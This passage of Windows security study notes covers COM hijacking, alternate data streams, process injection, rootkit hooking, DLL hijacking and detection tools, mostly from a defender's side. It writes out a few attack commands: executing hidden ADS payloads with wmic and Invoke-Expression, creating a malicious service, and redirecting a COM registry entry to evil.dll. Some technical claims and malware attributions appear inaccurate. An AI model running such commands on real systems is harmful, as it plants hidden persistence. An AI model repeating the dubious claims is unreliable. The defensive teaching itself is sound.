  - **Persistence mechanisms** (Run keys, WMI subscriptions).  
✔ **Lightweight & agentless** (runs on-demand).  

### **Example Command:**  
```powershell
Invoke-PSHunt -ScanType Full -OutputFormat CSV
```
**Use Case:**  
- **Daily proactive hunts** for signs of **fileless malware** or **living-off-the-land (LOLBAS)** attacks.  

### **Pros & Cons:**  
| ✅ **Pros**                 | ❌ **Cons**                           |
| -------------------------- | ------------------------------------ |
| **Focused on IOCs & TTPs** | **Not real-time** (scans on-demand)  |
| **Easy to deploy**         | Less effective against **zero-days** |

---

## **Comparison Table**  
| **Tool**   | **Primary Use**         | **Data Collected**        | **Best For**             |
| ---------- | ----------------------- | ------------------------- | ------------------------ |
| **Kansa**  | Incident Response (IR)  | Processes, logs, network  | Rapid triage post-breach |
| **NOAH**   | Network Anomaly Hunting | NetFlow, PCAPs            | Detecting C2 beacons     |
| **PSHunt** | Threat Hunting (TH)     | IOCs, registry, processes | Proactive hunting        |

---

## **How to Use These Tools Together?**  
1. **First, use Kansa** → Collect forensic data after an alert.  
2. **Then, use PSHunt** → Scan for known IOCs in the collected data.  
3. **Finally, use NOAH** → Check network logs for hidden C2 traffic.  

---


# **COM Hijacking: A Stealthy Persistence Technique**  

**COM Hijacking** (Component Object Model Hijacking) is a **persistence and privilege escalation** technique where attackers **abuse the Windows COM system** to execute malicious code when legitimate applications load COM objects.  

## **How COM Hijacking Works?**  
1. **COM Basics**:  
   - Windows uses **COM objects** (DLLs, EXEs) for inter-process communication.  
   - Applications reference COM objects via **CLSID (Class ID)** and **ProgID** in the registry.  

2. **Hijacking Process**:  
   - Attackers **modify registry keys** (`HKCU\Software\Classes\CLSID` or `HKLM\Software\Classes\CLSID`) to point to a **malicious DLL/EXE**.  
   - When a legitimate application loads the hijacked COM object, the **malicious payload executes**.  

### **Example Attack Flow**  
1. **Identify a vulnerable COM object** (e.g., `MMDeviceEnumerator` used by audio services).  
2. **Replace the registered DLL path** with a malicious one:  
   ```
   HKCU\Software\Classes\CLSID\{ABC123}\InprocServer32  
   Default = "C:\Malware\evil.dll"  
   ```  
3. **Trigger execution** when a trusted app (e.g., `explorer.exe`) loads the COM object.  

---

## **Why is COM Hijacking Dangerous?**  
✔ **Stealthy**: No new files/processes are created (fileless).  
✔ **Persistence**: Survives reboots (if set in `HKLM`).  
✔ **Privilege Escalation**: Can run as **SYSTEM** if hijacking a system COM object.  

---

## **Common COM Hijacking Targets**  
| **COM Object**                 | **Legitimate Use**      | **Attack Scenario**                           |
| ------------------------------ | ----------------------- | --------------------------------------------- |
| **MMDeviceEnumerator**         | Audio device management | Malicious DLL loads when audio services start |
| **Scriptlet.FileSystemObject** | File system access      | Executes malicious scripts                    |
| **WScript.Shell**              | Runs shell commands     | Executes PowerShell payloads                  |

---

## **Detection & Mitigation**  
### **1. Detection Methods**  
- **Registry Monitoring** (e.g., Sysmon Event IDs **12,13,14** for COM key changes).  
- **Process Monitor (ProcMon)** → Filter for `RegSetValue` on `CLSID` paths.  
- **EDR/SIEM Alerts** → Unusual COM object loads (e.g., `rundll32.exe` calling a non-standard DLL).  

### **2. Mitigation Strategies**  
✔ **Restrict registry permissions** (limit write access to `CLSID` keys).  
✔ **Use AppLocker** to block untrusted DLLs/EXEs.  
✔ **Monitor COM object loads** with tools like **Sysinternals Autoruns**.  

---

## **Real-World Examples**  
- **APT29 (Cozy Bear)** used COM hijacking in the **SolarWinds breach**.  
- **Emotet** abused `WScript.Shell` for script-based attacks.  

---

## **Tools for Analyzing COM Hijacking**  
| **Tool**                                                      | **Purpose**                        |
| ------------------------------------------------------------- | ---------------------------------- |
| **Autoruns (Sysinternals)**                                   | Scans for hijacked COM entries     |
| **Process Monitor**                                           | Tracks COM object registry changes |
| **PowerShell (`Get-ChildItem HKLM:\Software\Classes\CLSID`)** | Manual registry inspection         |

---

### **Final Thoughts**  
COM Hijacking is a **fileless, persistent, and hard-to-detect** technique. Defenders must:  
✅ **Monitor registry changes** (especially `CLSID` keys).  
✅ **Use EDR solutions** with behavioral detection.  
✅ **Hunt for suspicious DLL loads** in memory.  

---
---
### **Classification of Viruses**  

Viruses are categorized based on their **infection method** and **behavior**. The main types include:  

---

## **1. Resident Viruses**  
### **Characteristics:**  
- **Load into memory** (RAM) and remain active even after the host program exits.  
- **Infect files** as they are accessed (e.g., when opened or executed).  
- **Difficult to remove** since they persist in memory.  

### **Examples:**  
- **CMJ/Meve** (infects EXE files when executed).  
- **Randex** (memory-resident file infector).  

### **Detection & Removal:**  
✔ **Memory forensics** (Volatility, Process Hacker).  
✔ **Reboot in Safe Mode** (prevents virus from reloading).  

---

## **2. Non-Resident Viruses**  
### **Characteristics:**  
- **Do not stay in memory** after execution.  
- **Act immediately**, infect files, then terminate.  
- **Less stealthy** than resident viruses.  

### **Examples:**  
- **W97M/Melissa** (spreads via Word macros, then exits).  
- **ILOVEYOU** (infects files, then stops running).  

### **Detection & Removal:**  
✔ **File integrity checks** (Tripwire, hash comparisons).  
✔ **Behavioral analysis** (sandboxing).  

---

## **3. Boot Sector Viruses**  
### **Characteristics:**  
- **Infect the Master Boot Record (MBR)** or **boot sector** of storage devices.  
- **Load before the OS**, making them hard to detect.  
- **Spread via infected USB drives or disks**.  

### **Examples:**  
- **Stoned** (classic boot sector virus).  
- **Brain** (first PC boot sector virus).  

### **Detection & Removal:**  
✔ **Boot from a clean OS** (Live CD/USB).  
✔ **Repair MBR** (using `bootrec /fixmbr` in Windows).  

---

## **4. Multipartite Viruses**  
### **Characteristics:**  
- **Hybrid** (infects both **files and boot sectors**).  
- **Highly destructive** due to multiple infection vectors.  
- **Difficult to eradicate** completely.  

### **Examples:**  
- **Ghostball** (first multipartite virus).  
- **Invader** (infects EXE files and MBR).  

### **Detection & Removal:**  
✔ **Full system scan** (antivirus + boot sector check).  
✔ **Reinstall OS** if heavily infected.  

---

## **Comparison Table**  
| **Virus Type**   | **Persistence**            | **Infection Target**  | **Stealth Level** |
| ---------------- | -------------------------- | --------------------- | ----------------- |
| **Resident**     | Stays in memory            | Files (when accessed) | High              |
| **Non-Resident** | Terminates after execution | Files (on execution)  | Low               |
| **Boot Sector**  | MBR/Bootloader             | Boot sector           | Very High         |
| **Multipartite** | Both memory & MBR          | Files + Boot sector   | Extreme           |

---

## **Additional Virus Classifications**  
- **Macro Viruses** (e.g., Melissa) → Infects Office documents.  
- **Polymorphic Viruses** (e.g., Storm Worm) → Changes code to evade detection.  
- **Metamorphic Viruses** (e.g., Simile) → Rewrites itself completely.  

---
---
### **Bootkits vs. Rootkits: A Detailed Comparison**  

Both **bootkits** and **rootkits** are **stealthy malware** designed to gain persistent control over a system, but they differ in **infection methods, persistence mechanisms, and detection challenges**.  

---

## **1. Definition & Core Function**  
| **Feature**       | **Bootkit** | **Rootkit** |
|-------------------|------------|------------|
| **Definition**    | A **boot-sector malware** that infects the **Master Boot Record (MBR)** or **UEFI firmware** to load before the OS. | A **kernel/user-mode malware** that hides processes, files, or registry keys by **modifying OS functions**. |
| **Primary Goal**  | Gain **early execution control** (pre-OS) to bypass security mechanisms. | **Hide malicious activity** (e.g., keyloggers, backdoors) from the OS and security tools. |

---

## **2. Infection Method**  
| **Feature**       | **Bootkit** | **Rootkit** |
|-------------------|------------|------------|
| **Infection Point** | Infects **MBR/VBR (Volume Boot Record)** or **UEFI firmware**. | Infects **kernel drivers** or **user-mode applications**. |
| **Execution Time** | **Before OS loads** (during boot process). | **After OS loads** (runs alongside system processes). |
| **Common Entry Vectors** | - Infected USB drives<br>- Compromised firmware updates | - Exploits (e.g., kernel vulnerabilities)<br>- Malicious drivers (e.g., signed driver abuse) |

---

## **3. Persistence Mechanism**  
| **Feature**       | **Bootkit** | **Rootkit** |
|-------------------|------------|------------|
| **Persistence** | Modifies **bootloader** (MBR/VBR) or **UEFI** to reload on every boot. | Hooks into **system calls** (SSDT, IDT) or **processes** (DLL injection). |
| **Removal Difficulty** | **Extremely hard** (requires boot sector repair or firmware reflash). | **Difficult** (may require offline scanning or OS reinstall). |

---

## **4. Detection & Evasion Techniques**  
| **Feature**       | **Bootkit** | **Rootkit** |
|-------------------|------------|------------|
| **Detection Challenges** | - Antivirus can't scan before OS loads<br>- UEFI implants evade traditional scans | - Hides processes/files/registry keys<br>- Bypasses API calls (e.g., `NtQuerySystemInformation`) |
| **Detection Methods** | - **Secure Boot** (blocks unsigned bootloaders)<br>- **Memory forensics** (Volatility) | - **Kernel-mode scans** (GMER, RootkitRevealer)<br>- **Behavioral analysis** (EDR) |

---

## **5. Real-World Examples**  
| **Bootkits** | **Rootkits** |
|--------------|-------------|
| - **TDL4** (MBR bootkit)<br>- **LoJax** (UEFI firmware bootkit) | - **Stuxnet** (kernel-mode rootkit)<br>- **Alureon** (combines bootkit + rootkit) |


---
---
### **Malware Delivery: Drive-by Downloads vs. Watering Hole Attacks**  

Both **drive-by downloads** and **watering hole attacks** are **stealthy malware distribution methods**, but they differ in **targeting, execution, and objectives**. Below is a detailed comparison:  

---

## **1. Drive-by Downloads**  
### **Definition:**  
Malware is **automatically downloaded** when a user visits a compromised or malicious website, often **without any interaction** (e.g., clicking a link).  

### **How It Works?**  
1. **Exploit Kit (EK) Deployment**  
   - Attackers use **EK tools** (e.g., Rig, Magnitude) to scan for browser/plugin vulnerabilities (e.g., Flash, Java, browser 0-days).  
2. **Silent Redirection**  
   - Victims land on a malicious site via:  
     - Malvertising (infected ads).  
     - SEO poisoning (fake search results).  
3. **Malware Execution**  
   - If the system is vulnerable, malware (e.g., ransomware, spyware) is **downloaded and executed automatically**.  

### **Example:**  
- A user visits a hacked news site → **Angler Exploit Kit** detects an old Flash Player → silently installs **CryptoLocker ransomware**.  

### **Defense:**  
✔ **Keep browsers/plugins updated** (disable Flash, Java if unused).  
✔ **Use ad-blockers** (uBlock Origin) to block malvertising.  
✔ **Deploy EDR/XDR** (to detect post-exploitation activity).  

---

## **2. Watering Hole Attack**  
### **Definition:**  
Attackers **compromise a legitimate website** frequently visited by a **specific target group** (e.g., employees of a company, government agencies).  

### **How It Works?**  
1. **Reconnaissance**  
   - Attackers study the target’s browsing habits (e.g., industry forums, software download sites).  
2. **Website Compromise**  
   - Hackers inject malicious JavaScript or exploit kits into the site.  
3. **Selective Targeting**  
   - Only **specific visitors** (e.g., IP ranges, user-agents) get malware.  
   - Often uses **zero-day exploits** to avoid detection.  

### **Example:**  
- A **defense contractor’s employees** visit a military tech blog → attackers inject **CVE-2021-40444 (MSHTML 0-day)** → installs **Cobalt Strike beacon**.  

### **Defense:**  
✔ **Network segmentation** (isolate high-risk users).  
✔ **Monitor web traffic anomalies** (unusual outbound connections).  
✔ **Use browser sandboxing** (e.g., Chrome Sandbox, FireFox Containers).  

---

## **Comparison Table**  
| **Feature**          | **Drive-by Download**                   | **Watering Hole Attack**              |
| -------------------- | --------------------------------------- | ------------------------------------- |
| **Targeting**        | Broad (any visitor)                     | Narrow (specific groups)              |
| **Delivery Method**  | Exploit kits, malvertising              | Compromised legitimate sites          |
| **User Interaction** | None required                           | None required (or social engineering) |
| **Stealth Level**    | Moderate (depends on EK)                | High (blends in with legit traffic)   |
| **Common Exploits**  | Browser/plugin flaws (e.g., Flash, PDF) | Zero-days, spear-phishing lures       |
| **Malware Examples** | Ransomware, banking trojans             | APT backdoors (e.g., Cobalt Strike)   |

---

## **Key Takeaways**  
1. **Drive-by downloads** → Mass-scale, opportunistic infections via **exploit kits**.  
2. **Watering hole attacks** → Highly targeted, often used in **APT campaigns**.  
3. **Defense overlap**:  
   - Patch browsers/plugins.  
   - Use **network monitoring** (detect callbacks to C2).  
   - Deploy **behavioral EDR** (blocks post-exploit activity).  

---
---

### **Alternate Data Streams (ADS) in Windows: Legitimate Use vs. Malicious Abuse**  

#### **What Are Alternate Data Streams (ADS)?**  
Alternate Data Streams (ADS) is a **file attribute feature** in **NTFS (New Technology File System)** that allows files to **store additional hidden metadata** within a primary file.  

- **Introduced in:** Windows NT 3.1 (1993).  
- **Primary Use:** Storing file metadata (e.g., thumbnails, author info, Mac OS resource forks).  
- **Hidden by Default:** ADS content does not appear in directory listings (`dir` command).  

---

## **Why Windows Uses ADS (Legitimate Purposes)**  
1. **File Metadata Storage**  
   - Windows Explorer uses ADS to store:  
     - **Thumbnail images** (`:$DATA` stream).  
     - **Zone.Identifier** (marks files downloaded from the internet).  
   - Example:  
     ```powershell
     Get-Item -Path "Document.docx" -Stream *  
     ```
     Output:  
     ```
     FileName: Document.docx  
     Stream   : :$DATA  
     Stream   : Zone.Identifier  
     ```  

2. **Mac OS Compatibility**  
   - NTFS ADS was designed to support **Macintosh resource forks** (HFS+ files).  

3. **Temporary Data Storage**  
   - Some apps (e.g., antivirus) use ADS for temporary logs.  

---

## **How Attackers Abuse ADS (Malicious Uses)**  
ADS is a **favorite hiding technique** for malware due to its stealth.  

### **1. Hiding Malicious Files**  
- **Attach malware to a benign file** (e.g., `readme.txt:hidden.exe`).  
- **Execute the hidden payload** via:  
  ```cmd
  wmic process call create "C:\Docs\readme.txt:hidden.exe"
  ```
  - The file appears normal in Explorer.  

### **2. Evading Detection**  
- **Bypass traditional AV scans** (some scanners ignore ADS).  
- **Hide scripts** (e.g., PowerShell commands in ADS):  
  ```cmd
  echo "malicious code" > cleanfile.txt:evil.ps1
  ```  
  Then execute:  
  ```powershell
  powershell -c Get-Content .\cleanfile.txt:evil.ps1 \| Invoke-Expression
  ```

### **3. Persistence Mechanisms**  
- Store **backdoor scripts** in ADS (e.g., `autorun.inf:payload.vbs`).  
- Use **scheduled tasks** to run hidden ADS scripts.  

---

## **Real-World ADS Attacks**  
| **Malware/Attack**    | **ADS Abuse Example**               |
| --------------------- | ----------------------------------- |
| **Stuxnet**           | Hid DLLs in ADS to avoid detection. |
| **APT29 (Cozy Bear)** | Used ADS to store C2 scripts.       |
| **Emotet Trojan**     | Dropped malicious payloads in ADS.  |

---

## **How to Detect & Remove ADS?**  
### **Detection Methods**  
1. **Using `dir /R` (CMD)**  
   ```cmd
   dir /R C:\Docs
   ```
   - Lists all streams.  

2. **PowerShell (Get-Item)**  
   ```powershell
   Get-Item -Path "file.txt" -Stream *  
   ```  

3. **Sysinternals Streams Tool**  
   ```cmd
   streams.exe -s C:\Docs
   ```  

### **Removal**  
- **Delete ADS content:**  
  ```cmd
  echo. > "file.txt:streamname"
  ```  
- **Use specialized tools:**  
  - **LADS** (List Alternate Data Streams).  
  - **Malwarebytes** (scans for malicious ADS).  



---
---

Here’s a concise breakdown of each technique, including how they work and why attackers use them:

---

### **1. DLL Injection**  
**What?** Forcing a process to load a malicious DLL into its memory space.  
**How?**  
1. Attacker gets a handle to the target process (`OpenProcess`).  
2. Allocates memory in the target (`VirtualAllocEx`).  
3. Writes DLL path (`WriteProcessMemory`).  
4. Triggers execution via `CreateRemoteThread` (calling `LoadLibrary`).  
**Why?** Stealthy persistence, evasion (runs within a trusted process).  
**Detection:** Monitor `LoadLibrary` calls from unusual processes.

---

### **2. Reflective DLL Injection**  
**What?** Loading a DLL directly from memory (no disk or `LoadLibrary`).  
**How?**  
1. Malicious DLL is stored in memory (e.g., downloaded via PowerShell).  
2. Attacker manually maps the DLL into the target process:  
   - Parses PE headers, resolves imports, fixes relocations.  
3. Executes via `CreateRemoteThread` or APC.  
**Why?** Evades traditional DLL monitoring (no `LoadLibrary`).  
**Detection:** Memory scanning for unsigned DLLs (e.g., CrowdStrike OverWatch).

---

### **3. Thread Hijacking**  
**What?** Hijacking a legitimate thread to run malicious code.  
**How?**  
1. Suspends a thread in the target process (`SuspendThread`).  
2. Overwrites thread context (e.g., `RIP` register) to point to shellcode.  
3. Resumes the thread (`ResumeThread`).  
**Why?** Stealthier than `CreateRemoteThread` (no new threads).  
**Detection:** Thread execution anomalies (e.g., EDR behavioral analysis).

---

### **4. PE Injection**  
**What?** Injecting an entire malicious PE (exe/dll) into another process.  
**How?**  
1. Write PE into target process memory (`VirtualAllocEx` + `WriteProcessMemory`).  
2. Manually resolve imports, apply relocations.  
3. Execute via thread creation or hijacking.  
**Why?** Runs payload without dropping a file.  
**Detection:** Unusual memory allocations (e.g., RWX regions).

---

### **5. Process Hollowing**  
**What?** Replacing legitimate process code with malicious payload.  
**How?**  
1. Create a suspended process (e.g., `svchost.exe`).  
2. Unmap its memory (`NtUnmapViewOfSection`).  
3. Inject malicious PE into the hollowed space.  
4. Resume execution.  
**Why?** Masquerades as a trusted process.  
**Detection:** Suspended process anomalies (e.g., Sysmon Event ID 1 + 10).

---

### **6. Hook Injection**  
**What?** Redirecting API calls to malicious code via hooks.  
**How?**  
1. Set Windows hooks (`SetWindowsHookEx`) for events (e.g., keystrokes).  
2. DLL with the hook is injected into target processes.  
3. Hook function executes malicious code.  
**Why?** Keyloggers, API tampering (e.g., hiding files).  
**Detection:** Monitor `SetWindowsHookEx` calls (especially global hooks).

---
---

### **Kernel-Mode Rootkits: SSDT Hooks & IRP Hooking**  

Kernel-mode rootkits operate at the **highest privilege level** (Ring 0), allowing them to **bypass security mechanisms**, hide processes/files, and manipulate system behavior. Two key techniques they use are:  

---

## **1. SSDT Hooking (System Service Descriptor Table Hook)**  
### **What is the SSDT?**  
- The **SSDT** (System Service Descriptor Table) is a **kernel structure** in Windows that maps **user-mode API calls** (e.g., `NtOpenProcess`, `NtReadFile`) to their **kernel-mode implementations**.  
- Used by the OS to transition from **user mode (Ring 3) → kernel mode (Ring 0)**.  

### **How SSDT Hooking Works?**  
1. **Locate the SSDT in memory** (exported by `ntoskrnl.exe`).  
2. **Modify the SSDT entries** to redirect API calls to malicious functions.  
   - Example:  
     - Original `NtOpenProcess` → Legitimate process opening function.  
     - Hooked `NtOpenProcess` → Filters results to hide malware processes.  
3. **Bypass security checks**:  
   - Hide processes from Task Manager (`NtQuerySystemInformation` hook).  
   - Block file access monitoring (`NtReadFile` hook).  

### **Detection & Mitigation**  
✔ **PatchGuard** (Windows Kernel Patch Protection) **blocks SSDT modifications** on x64 systems.  
✔ **Driver Signature Enforcement (DSE)** prevents unsigned rootkit drivers.  
✔ **Tools:** GMER, WinDbg (`!ssdt` command).  

---

## **2. IRP Hooking (I/O Request Packet Hooking)**  
### **What are IRPs?**  
- **IRPs (I/O Request Packets)** are kernel structures used for **device communication** (e.g., file operations, network traffic).  
- Every **driver** has an **IRP dispatch table** (functions handling `IRP_MJ_READ`, `IRP_MJ_WRITE`, etc.).  

### **How IRP Hooking Works?**  
1. **Locate the target driver’s IRP table** (e.g., `tcpip.sys` for network filtering).  
2. **Replace IRP handlers** with malicious functions:  
   - Example:  
     - Original `IRP_MJ_READ` → Legitimate disk read.  
     - Hooked `IRP_MJ_READ` → Hides malicious files from reads.  
3. **Common Attacks:**  
   - **Network filtering** (hide C2 traffic).  
   - **File hiding** (ransomware encrypts files but hides them from `dir`).  

### **Detection & Mitigation**  
✔ **Kernel-mode EDR** (e.g., CrowdStrike Falcon) monitors IRP anomalies.  
✔ **Driver Verifier** (`verifier.exe`) checks for hooked IRPs.  
✔ **Tools:** Process Hacker, Volatility (`driverirp` plugin).  

---

## **Comparison: SSDT Hooks vs. IRP Hooks**  
| **Feature**              | **SSDT Hooking**             | **IRP Hooking**                   |
| ------------------------ | ---------------------------- | --------------------------------- |
| **Target**               | System call table (SSDT)     | Driver I/O handlers               |
| **Primary Abuse**        | Hide processes/files         | Filter network/files              |
| **Detection Difficulty** | Hard (x64 PatchGuard blocks) | Hard (requires driver inspection) |
| **Example Rootkits**     | TDL4, ZeroAccess             | Necurs, Alureon                   |

---
---

### **Userland Rootkits: IAT, EAT, and Inline Hooking**  

Userland rootkits operate in **Ring 3** (user mode) and manipulate process memory to **hide malicious activity, intercept API calls, and evade detection**. Three common techniques are:  

---

## **1. IAT Hooking (Import Address Table Hooking)**  
### **What is the IAT?**  
- The **Import Address Table (IAT)** stores addresses of **external functions** (APIs) a process calls (e.g., `MessageBoxA`, `CreateFileW`).  
- Located in the **PE (Portable Executable) header** of a binary.  

### **How IAT Hooking Works?**  
1. **Locate the IAT** of the target process (e.g., `explorer.exe`).  
2. **Replace the original API address** (e.g., `ReadFile`) with a **malicious function**.  
3. **Intercept & Modify Behavior**:  
   - Example:  
     - Legitimate `ReadFile` → Reads file content.  
     - Hooked `ReadFile` → Hides specific files from being read.  

### **Detection & Mitigation**  
✔ **PE-scanning tools** (PE-sieve, Process Hacker) detect IAT modifications.  
✔ **API call monitoring** (EDR, Sysmon Event ID **10** – `ProcessAccess`).  

---

## **2. EAT Hooking (Export Address Table Hooking)**  
### **What is the EAT?**  
- The **Export Address Table (EAT)** lists functions **exposed by a DLL** (e.g., `kernel32.dll` exports `CreateProcessA`).  
- Used when other processes call APIs from the DLL.  

### **How EAT Hooking Works?**  
1. **Target a DLL** (e.g., `user32.dll`).  
2. **Modify the EAT** to redirect exported functions to malicious code.  
3. **Affects all processes** using the hooked DLL.  

### **Example Attack**  
- Hook `MessageBoxA` in `user32.dll` → Logs all dialog box inputs.  

### **Detection & Mitigation**  
✔ **DLL integrity checks** (Windows Defender, Sigcheck).  
✔ **Memory scanning** for hooked EAT entries (GMER, Volatility).  

---

## **3. Inline Hooking (Direct Code Patching)**  
### **What is Inline Hooking?**  
- **Overwrites the first few bytes** of an API function in memory with a **`JMP` instruction** to malicious code.  
- More **stealthy** than IAT/EAT hooks (no PE modification).  

### **How Inline Hooking Works?**  
1. **Locate the target API** in memory (e.g., `NtQueryDirectoryFile`).  
2. **Overwrite the prologue** (e.g., `MOV EDI, EDI` → `JMP evil_function`).  
3. **Trampoline back** to the original function after execution.  

### **Example Attack**  
- Hook `NtQueryDirectoryFile` → Hide files from `dir`/Explorer.  

### **Detection & Mitigation**  
✔ **Memory scanning** for `JMP` instructions in API code (EDR/XDR).  
✔ **Control Flow Guard (CFG)** blocks unexpected jumps.  

---
---


### **DLL Hijacking Techniques: Search Order, Phantom DLL, and Side-Loading**  

DLL hijacking is a technique where attackers **trick applications into loading malicious DLLs** instead of legitimate ones. Below are three common methods:  

---

## **1. Search Order Hijacking (Classic DLL Hijacking)**  
### **How It Works?**  
Windows searches for DLLs in a **specific order** (unless `SetDllDirectory` is used). Attackers place a malicious DLL in a **higher-priority location** than the legitimate one.  

### **Default Search Order (Windows):**  
1. **Application directory** (where the EXE is).  
2. **System directories** (`C:\Windows\System32`).  
3. **Current working directory**.  
4. **PATH environment variable** directories.  

### **Attack Scenario:**  
- A vulnerable app (e.g., `notepad.exe`) looks for `malicious.dll` before checking `System32`.  
- Attacker drops `malicious.dll` in the same folder as the app → **DLL gets loaded instead of the real one**.  

### **Mitigation:**  
✔ Use **absolute paths** or `SetDllDirectory` to restrict DLL loading.  
✔ Enable **DLL Safe Search Mode** (requires admin rights).  

---

## **2. Phantom DLL Hijacking (Missing DLL Exploitation)**  
### **How It Works?**  
Some apps **try to load non-existent DLLs** (due to programming errors). Attackers **plant a malicious DLL with the expected name** in a writable directory.  

### **Example:**  
- App tries to load `legit.dll` (which doesn’t exist).  
- Attacker places `legit.dll` in `C:\Temp` → **app loads the malicious DLL**.  

### **Mitigation:**  
✔ **Audit applications** for missing DLL dependencies.  
✔ **Restrict write permissions** in common hijackable paths (`C:\Temp`, `%APPDATA%`).  

---

## **3. DLL Side-Loading (Legitimate Binary Abuse)**  
### **How It Works?**  
Attackers **replace a legitimate DLL** used by a signed application (e.g., `app.exe` loads `valid.dll`).  
- The malicious DLL is **signed or has the same name** as the expected one.  
- The app loads it **because it trusts the binary’s signature**.  

### **Example:**  
- A trusted app (e.g., `Adobe Reader`) loads `malicious.dll` because it’s in the same folder.  
- The DLL may be **signed with a stolen certificate** to evade detection.  

### **Mitigation:**  
✔ **Enable Windows Defender Attack Surface Reduction (ASR)** rules.  
✔ **Use Microsoft’s Sigcheck** to verify DLL signatures.  

---

## **Comparison of DLL Hijacking Techniques**  
| **Technique**    | **Trigger Condition**                    | **Stealth Level** | **Example Malware**   |
| ---------------- | ---------------------------------------- | ----------------- | --------------------- |
| **Search Order** | App loads DLL from a writable path first | Medium            | **DarkComet RAT**     |
| **Phantom DLL**  | App tries to load a missing DLL          | High              | **APT29 (Cozy Bear)** |
| **Side-Loading** | Legitimate app loads a malicious DLL     | Very High         | **Emotet,TrickBot**   |

---

## **Defense Strategies**  
1. **Application Hardening:**  
   - Use **manifest files** to enforce DLL integrity.  
   - Set **`LOAD_LIBRARY_SEARCH_DEFAULT_DIRS`** flag.  
2. **Endpoint Protection:**  
   - **EDR/XDR** (e.g., CrowdStrike, SentinelOne) monitors DLL loads.  
3. **Permissions & Logging:**  
   - **Restrict write access** to `C:\Windows`, `Program Files`.  
   - **Log DLL loads** (Sysmon Event ID **7**).  

---


Here's a concise breakdown of the **key Windows system processes**, their roles, and security implications:

---

### **1. `smss.exe` (Session Manager Subsystem)**  
- **Parent Process**: `System` (PID 4)  
- **Role**:  
  - Initializes user sessions (creates `csrss.exe` and `winlogon.exe`).  
  - Handles system critical tasks during boot.  
- **Security Notes**:  
  - Rarely targeted, but some rootkits inject into it.  
  - Runs as **SYSTEM**; any child process spawning is suspicious.  

---

### **2. `wininit.exe` (Windows Initialization Process)**  
- **Parent Process**: `smss.exe`  
- **Role**:  
  - Launches critical system processes (`lsass.exe`, `lsm.exe`, `services.exe`).  
  - Manages the **Windows logon screen**.  
- **Security Notes**:  
  - Runs as **SYSTEM**; malware may abuse it to persist.  
  - Look for unusual child processes (e.g., `cmd.exe`).  

---

### **3. `lsm.exe` (Local Session Manager)**  
- **Parent Process**: `wininit.exe`  
- **Role**:  
  - Manages terminal server sessions (RDP).  
  - Coordinates user session states.  
- **Security Notes**:  
  - Seldom targeted; termination can crash the system.  
  - Monitor for unexpected network connections (RDP hijacking).  

---

### **4. `services.exe` (Service Control Manager)**  
- **Parent Process**: `wininit.exe`  
- **Role**:  
  - Starts/stops Windows services (e.g., `svchost.exe` instances).  
  - Manages service dependencies.  
- **Security Notes**:  
  - Common target for **DLL hijacking** (e.g., via `wer.dll`).  
  - Check for malicious services (e.g., `sc.exe create EvilService binPath= "C:\malware.exe"`).  

---

### **5. `taskhost.exe` (Task Host)**  
- **Parent Process**: `services.exe`  
- **Role**:  
  - Hosts DLL-based **background tasks** (e.g., Windows Update, UI themes).  
  - Replaced `svchost.exe` for some tasks in newer Windows versions.  
- **Security Notes**:  
  - Legitimate path: `C:\Windows\System32`.  
  - Malware may impersonate it (check command line: `taskhost.exe -Embedding` is normal).  

---

### **Security Best Practices**  
1. **Process Monitoring**:  
   - Use **Sysmon** (Event ID 1) to log process creations.  
   - Alert on `smss.exe` spawning unexpected children (e.g., `powershell.exe`).  
2. **Integrity Checks**:  
   - Verify digital signatures (`sigcheck.exe -m services.exe`).  
3. **Anomaly Detection**:  
   - Unusual parent-child relationships (e.g., `wininit.exe` → `cmd.exe`).  

---

### **Comparison Table**  
| Process        | Parent         | Runs As | Common Abuse Tactics              |
| -------------- | -------------- | ------- | --------------------------------- |
| `smss.exe`     | `System`       | SYSTEM  | Rootkit injection (rare)          |
| `wininit.exe`  | `smss.exe`     | SYSTEM  | Persistence via child processes   |
| `lsm.exe`      | `wininit.exe`  | SYSTEM  | RDP session hijacking             |
| `services.exe` | `wininit.exe`  | SYSTEM  | DLL hijacking, malicious services |
| `taskhost.exe` | `services.exe` | User    | Masquerading malware              |

---

Here's a concise breakdown of each Microsoft management and security tool:

---

### **1. SCCM (System Center Configuration Manager)**
**Purpose:** Enterprise-grade system management for deploying software, updates, and enforcing policies across Windows devices.  
**Key Features:**  
- **Software Deployment** (MSI/EXE packages)  
- **Patch Management** (Windows Updates, third-party patching)  
- **OS Deployment** (PXE, imaging)  
- **Endpoint Protection** (integrated with Defender)  
- **Inventory & Reporting** (hardware/software audits)  

**Security Relevance:**  
✔ Critical for **patch compliance** (prevents exploits like EternalBlue).  
✔ Can deploy **security baselines** (e.g., DISA STIGs).  

---

### **2. PowerShell Desired State Configuration (DSC)**
**Purpose:** Infrastructure-as-Code (IaC) tool to enforce system configurations declaratively.  
**Key Features:**  
- **Define configurations** (e.g., "Ensure IIS is installed") in `.ps1` files.  
- **Idempotent enforcement** (automatically corrects configuration drift).  
- **Cross-platform** (Linux/macOS via DSC Core).  

**Example Use Case:**  
```powershell
Configuration HardenWebServer {
    Node "Server01" {
        WindowsFeature IIS {
            Ensure = "Absent"  # Blocks unneeded IIS
            Name   = "Web-Server"
        }
    }
}
```
**Security Relevance:**  
✔ Enforces **hardening standards** (e.g., disabling SMBv1).  
✔ Prevents **unauthorized changes** (e.g., registry keys).  

---

### **3. Microsoft Security Compliance Manager (SCM)**
**Purpose:** Tool to create, manage, and deploy security baselines for Windows.  
**Key Features:**  
- **Pre-configured templates** for CIS, NIST, DISA STIGs.  
- **Compare baselines** (e.g., Windows 10 vs. Windows 11).  
- **Export to GPO/SCCM** for enterprise deployment.  

**Security Relevance:**  
✔ Accelerates **compliance** (HIPAA, GDPR).  
✔ Reduces manual effort in **Group Policy hardening**.  

---

### **Comparison Table**
| Tool                            | Primary Use Case                         | Security Impact                                    |
| ------------------------------- | ---------------------------------------- | -------------------------------------------------- |
| **SCCM**                        | Centralized device management            | Ensures patch compliance, deploys security configs |
| **PowerShell DSC**              | Automated configuration enforcement      | Prevents configuration drift                       |
| **Security Compliance Manager** | Baseline creation & compliance reporting | Standardizes security policies                     |

---

### **How They Work Together?**
1. **SCM** generates a security baseline (e.g., disable LLMNR).  
2. **SCCM** deploys the baseline as a GPO or application.  
3. **DSC** continuously enforces the baseline (e.g., reverts if LLMNR is re-enabled).  

---

### **Key Security Benefits**
- **SCCM:** Reduces attack surface via timely updates.  
- **DSC:** Eliminates manual misconfigurations.  
- **SCM:** Maps configurations to **regulatory frameworks**.  

